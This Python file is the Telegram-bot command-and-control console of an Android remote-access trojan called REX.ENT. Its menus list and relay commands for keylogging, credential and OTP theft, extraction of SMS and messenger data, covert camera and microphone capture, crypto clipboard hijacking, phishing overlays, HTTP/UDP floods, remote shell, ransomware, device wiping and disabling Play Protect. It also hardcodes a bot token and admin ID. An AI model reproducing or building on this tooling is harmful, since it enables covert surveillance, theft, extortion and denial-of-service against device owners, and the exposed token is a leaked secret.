import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import BadRequest

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = "8706854210:AAFMuhAjVab0qlX-9o4YFPY94qJqXXhv-rU"
ADMIN_CHAT_ID = 8601209747

MAIN_MENU = [
    [InlineKeyboardButton("📁 File Manager", callback_data="tab_file")],
    [InlineKeyboardButton("📍 Location", callback_data="tab_loc"), InlineKeyboardButton("💬 SMS/Calls", callback_data="tab_sms")],
    [InlineKeyboardButton("📷 Camera", callback_data="tab_cam"), InlineKeyboardButton("🎙 Audio", callback_data="tab_aud")],
    [InlineKeyboardButton("🖥 Screen", callback_data="tab_scr"), InlineKeyboardButton("⌨ Keylogger", callback_data="tab_key")],
    [InlineKeyboardButton("📱 Device Info", callback_data="tab_dev"), InlineKeyboardButton("📋 Clipboard", callback_data="tab_clip")],
    [InlineKeyboardButton("🔔 Notifications", callback_data="tab_notif"), InlineKeyboardButton("📦 Stealer", callback_data="tab_steal")],
    [InlineKeyboardButton("🌐 Network / DoS", callback_data="tab_net"), InlineKeyboardButton("⚙ Shell", callback_data="tab_shell")],
    [InlineKeyboardButton("🛡 System", callback_data="tab_sys"), InlineKeyboardButton("💣 Destroy", callback_data="tab_destroy")],
    [InlineKeyboardButton("🆔 Set Active Session", callback_data="set_session")],
]

TAB_COMMANDS = {
    "tab_file": ["/ls [SESSION] /sdcard", "/download [SESSION] /sdcard/Download/file.txt", "/rm [SESSION] /sdcard/file.txt", "/rename [SESSION] /old /new", "/search [SESSION] /sdcard filename", "/zip [SESSION] /sdcard/folder"],
    "tab_loc": ["/location [SESSION]", "/gps [SESSION]", "/geofence [SESSION] -6.2 106.8 500"],
    "tab_sms": ["/sms_list [SESSION] 20", "/sendsms [SESSION] 0812xxxx 'Hello'", "/delsms [SESSION] 1", "/calls [SESSION] 30", "/contacts [SESSION]", "/sms_fwd [SESSION] +62xxx", "/sim_info [SESSION]", "/ussd [SESSION] *888#"],
    "tab_cam": ["/photo_front [SESSION]", "/photo_back [SESSION]", "/record [SESSION] 15", "/call_record [SESSION] 30"],
    "tab_aud": ["/mic [SESSION] 30", "/liveaudio [SESSION]"],
    "tab_scr": ["/screenshot [SESSION]", "/screenrecord [SESSION] 30", "/screen_lock [SESSION] YOUR DEVICE IS LOCKED", "/screen_unlock [SESSION]", "/stream_start [SESSION] 8888", "/stream_stop [SESSION]"],
    "tab_key": ["/keylog_start [SESSION]", "/keylog_dump [SESSION]", "/keylog_stop [SESSION]", "/cred_harvest_start [SESSION]", "/cred_dump [SESSION]"],
    "tab_dev": ["/info [SESSION]", "/apps [SESSION]", "/battery [SESSION]", "/network [SESSION]", "/permissions [SESSION]", "/cpu_ram [SESSION]", "/usage [SESSION]", "/process_list [SESSION]"],
    "tab_clip": ["/clipboard [SESSION]", "/setclip [SESSION] HelloWorld", "/crypto_monitor_start [SESSION]", "/crypto_monitor_stop [SESSION]", "/crypto_hijack_start [SESSION]", "/crypto_hijack_stop [SESSION]"],
    "tab_notif": ["/notif [SESSION]", "/fakenotif [SESSION] Test Hello", "/otp_scan [SESSION]", "/reply [SESSION] com.whatsapp Hello"],
    "tab_steal": ["/steal_images [SESSION]", "/steal_docs [SESSION]", "/extract_wa [SESSION]", "/extract_tg [SESSION]", "/cookies [SESSION]", "/history [SESSION]", "/calendar_dump [SESSION]"],
    "tab_net": ["/httpflood [SESSION] http://target.com 50", "/udpflood [SESSION] 1.2.3.4 53 30", "/wifi_scan [SESSION]", "/wifi_pass [SESSION]", "/bluetooth [SESSION]"],
    "tab_shell": ["/shell [SESSION] ls -la", "/sush [SESSION] id", "/kill_pid [SESSION] 1234", "/kill_pkg [SESSION] com.android.chrome"],
    "tab_sys": ["/openurl [SESSION] https://google.com", "/toast [SESSION] hacked", "/phish [SESSION] Google Verify", "/vibrate [SESSION] 2000", "/playsound [SESSION]", "/lock [SESSION]", "/hideicon [SESSION]", "/autostart [SESSION]", "/flashlight [SESSION] true", "/volume [SESSION] 10", "/brightness [SESSION] 150", "/ring_mode [SESSION] silent", "/wallpaper [SESSION] https://example.com/img.jpg", "/speak [SESSION] Hello World", "/launch [SESSION] com.android.chrome", "/uninstall [SESSION] com.example.app", "/update [SESSION] https://example.com/update.apk", "/overlay_phish [SESSION] Bank Verify", "/overlay_remove [SESSION]", "/fake_update [SESSION]"],
    "tab_destroy": ["/wipe [SESSION]", "/destroy [SESSION]", "/uninstall_block [SESSION]", "/uninstall_unblock [SESSION]"],
}

def get_active_session(context: ContextTypes.DEFAULT_TYPE) -> str:
    return context.user_data.get("active_session", "ALL")

def set_active_session(context: ContextTypes.DEFAULT_TYPE, session: str):
    context.user_data["active_session"] = session.upper()

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    if isinstance(context.error, BadRequest) and "not modified" in str(context.error).lower():
        return
    logger.error(f"Update {update} caused error: {context.error}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    active = get_active_session(context)
    await update.message.reply_text(
        "🔰 <b>REX.ENT C2 CENTER</b>\n"
        f"<b>Active target:</b> <code>{active}</code>\n\n"
        "Select a tab to see available commands.\n"
        "Change target with <code>/session SESSION_ID</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(MAIN_MENU)
    )

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    await update.message.reply_text(
        "<b>📋 REX.ENT v6.0 — COMMAND MENU</b>\n\n" +
        "<b>📁 File Manager</b>\n<code>/ls /download /rm /rename /search /zip</code>\n\n" +
        "<b>📍 Location</b>\n<code>/location /gps /geofence</code>\n\n" +
        "<b>💬 SMS / Calls</b>\n<code>/sms_list /sendsms /delsms /calls /contacts /sms_fwd</code>\n\n" +
        "<b>📷 Camera</b>\n<code>/photo_front /photo_back /record /call_record</code>\n\n" +
        "<b>🎙 Audio</b>\n<code>/mic /liveaudio</code>\n\n" +
        "<b>🖥 Screen</b>\n<code>/screenshot /screenrecord /screen_lock /screen_unlock /stream_start /stream_stop</code>\n\n" +
        "<b>⌨ Keylogger</b>\n<code>/keylog_start /keylog_stop /keylog_dump</code>\n\n" +
        "<b>📱 Device</b>\n<code>/info /apps /battery /network /permissions /cpu_ram /usage</code>\n\n" +
        "<b>📋 Clipboard</b>\n<code>/clipboard /setclip /crypto_monitor_start /crypto_hijack_start /crypto_hijack_stop</code>\n\n" +
        "<b>🔔 Notification</b>\n<code>/notif /fakenotif /otp_scan /reply</code>\n\n" +
        "<b>📦 Stealer</b>\n<code>/steal_images /steal_docs /extract_wa /extract_tg /cookies /history</code>\n\n" +
        "<b>🌐 Network</b>\n<code>/httpflood /udpflood /wifi_scan /wifi_pass /bluetooth</code>\n\n" +
        "<b>⚙ Shell</b>\n<code>/shell /sush /process_list /kill_pid /kill_pkg</code>\n\n" +
        "<b>🛡 System</b>\n<code>/openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon</code>\n\n" +
        "<b>🎣 Phishing</b>\n<code>/overlay_phish /overlay_remove /fake_update</code>\n\n" +
        "<b>🔐 Protection</b>\n<code>/uninstall_block /uninstall_unblock</code>\n\n" +
        "<b>🎮 Control</b>\n<code>/flashlight /volume /brightness /ring_mode /wallpaper /speak</code>\n\n" +
        "<b>➕ Other</b>\n<code>/sim_info /ussd /calendar_dump /launch /update /check_env /gmail /socmed /cred_harvest_start /cred_dump</code>\n\n" +
        "<b>🆕 CRITICAL v6.0</b>\n" +
        "<code>/stream_live [port]</code> — Live screen streaming\n" +
        "<code>/stream_live_stop</code> — Stop live stream\n" +
        "<code>/ransomware [path] [key]</code> — Encrypt files (AES‑256)\n" +
        "<code>/decrypt [path] [key]</code> — Decrypt ransomware\n" +
        "<code>/lock_capture_start</code> — Start PIN/pattern capture\n" +
        "<code>/lock_capture_stop</code> — Stop & dump captured credentials\n" +
        "<code>/anti_vm</code> — Run anti‑VM/emulator detection\n" +
        "<code>/disable_playprotect</code> — Disable Play Protect\n" +
        "<code>/enable_playprotect</code> — Re‑enable Play Protect\n" +
        "<code>/block_tap_start</code> — Block force‑close/uninstall buttons\n" +
        "<code>/block_tap_stop</code> — Stop blocking",
        parse_mode=ParseMode.HTML
    )

async def set_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    parts = update.message.text.strip().split()
    if len(parts) >= 2:
        set_active_session(context, parts[1])
        await update.message.reply_text(f"✅ Active session set to <code>{parts[1].upper()}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("Usage: <code>/session SESSION_ID</code>", parse_mode=ParseMode.HTML)

async def tab_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "set_session":
        active = get_active_session(context)
        await query.edit_message_text(
            f"<b>Select target session</b> (current: <code>{active}</code>)\n"
            "Or type <code>/session SESSION_ID</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ALL (all devices)", callback_data="sess_ALL")],
                [InlineKeyboardButton("SESSION_XXXX (input manual)", callback_data="sess_manual")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
            ])
        )
        return

    if data.startswith("sess_"):
        if data == "sess_ALL": set_active_session(context, "ALL")
        elif data == "sess_manual":
            await query.edit_message_text("Type the session ID after <code>/session</code>:\n<code>/session SESSION_12345</code>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(MAIN_MENU))
            return
        active = get_active_session(context)
        await query.edit_message_text(f"✅ Active target set to <code>{active}</code>", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(MAIN_MENU))
        return

    if data == "back_main":
        await query.edit_message_text("Select a tab:", reply_markup=InlineKeyboardMarkup(MAIN_MENU))
        return

    if data in TAB_COMMANDS:
        active = get_active_session(context)
        commands = TAB_COMMANDS[data]
        rendered = [c.replace("[SESSION]", active) for c in commands]
        txt = f"📌 <b>{data.replace('tab_','').upper()}</b> (target: <code>{active}</code>)\n\n"
        txt += "\n".join(f"<code>{c}</code>" for c in rendered)
        await query.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(MAIN_MENU))
        return

    await query.edit_message_text("Unknown action.", reply_markup=InlineKeyboardMarkup(MAIN_MENU))

async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID: return
    cmd = update.message.text.strip()
    logger.info(f"Relaying: {cmd}")

    need_target = {
        "/ls","/download","/rm","/rename","/sms_list","/sendsms","/delsms",
        "/calls","/contacts","/location","/gps","/photo_front","/photo_back",
        "/record","/mic","/liveaudio","/screenshot","/screenrecord",
        "/keylog_start","/keylog_stop","/keylog_dump","/info","/apps",
        "/battery","/network","/permissions","/clipboard","/setclip",
        "/notif","/fakenotif","/steal_images","/steal_docs","/extract_wa",
        "/extract_tg","/httpflood","/udpflood","/shell","/sush","/openurl",
        "/toast","/phish","/vibrate","/playsound","/lock","/wipe","/destroy",
        "/hideicon","/autostart","/socmed"
    }

    parts = cmd.split()
    if parts and parts[0].lower() in need_target:
        if len(parts) < 2 or not (parts[1].startswith("SESSION_") or parts[1].upper() == "ALL"):
            active = get_active_session(context)
            parts.insert(1, active)
            cmd = " ".join(parts)
            logger.info(f"Auto-inserted session: {cmd}")

    await update.message.reply_text(
        f"📤 <b>Sent:</b> <code>{cmd}</code>\n<i>Awaiting device...</i>",
        parse_mode=ParseMode.HTML
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu))
    app.add_handler(CommandHandler("session", set_session_cmd))
    app.add_handler(CallbackQueryHandler(tab_handler))
    all_commands = [
        "info","ls","download","rm","rename","sms_list","sendsms","delsms",
        "calls","contacts","location","gps","photo_front","photo_back",
        "record","mic","liveaudio","screenshot","screenrecord",
        "keylog_start","keylog_stop","keylog_dump","apps","battery",
        "network","permissions","clipboard","setclip","notif","fakenotif",
        "steal_images","steal_docs","extract_wa","extract_tg",
        "httpflood","udpflood","shell","sush","openurl","toast","phish",
        "vibrate","playsound","lock","wipe","destroy","hideicon","autostart","socmed"
    ]
    app.add_handler(CommandHandler(all_commands, relay))
    logger.info("Bot started – full tab menu + /menu command")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
